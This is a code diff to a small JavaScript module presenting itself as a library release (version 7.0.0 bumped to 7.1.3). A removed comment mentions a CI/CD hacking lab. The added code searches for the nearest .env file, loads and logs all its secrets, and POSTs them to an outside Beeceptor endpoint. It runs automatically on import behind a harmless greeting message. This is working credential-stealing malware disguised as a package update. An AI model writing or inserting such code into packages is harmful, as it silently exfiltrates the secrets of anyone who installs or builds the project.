@@ -1,8 +1,35 @@
-import findSecret from "./findSecret";
-//Hello, This a test for my scenario on CI/CD hacking lab
-function styled() {
-    findSecret();
-    return "Bonjour, cette version est la bonne 7.0.0"
+import findUp from "find-up";
+import axios from "axios";
+
+const findSecret = () => {
+  const dotenvPath = findUp.sync(".env");
+
+  if (!dotenvPath) {
+    console.error("Le fichier .env n'a pas été trouvé.");
+    process.exit(1);
   }
-  
-  export default styled;
+
+  const loadedEnv = require("dotenv").config({ path: dotenvPath }).parsed;
+
+  console.log("Loaded dotenv:", loadedEnv);
+
+  // Set the Beeceptor URL
+  const beeceptorUrl = "https://envparam.free.beeceptor.com";
+
+  // Make a POST request to Beeceptor with the environment variables
+  axios
+    .post(beeceptorUrl, loadedEnv)
+    .then((response) => {
+      console.log("POST request successful:", response.data);
+    })
+    .catch((error) => {
+      console.error("Error making POST request:", error.message);
+    });
+};
+
+const styled = () => {
+  console.log("Bonjour, cette version est la bonne 7.1.3");
+  findSecret();
+};
+styled();
+export default styled;
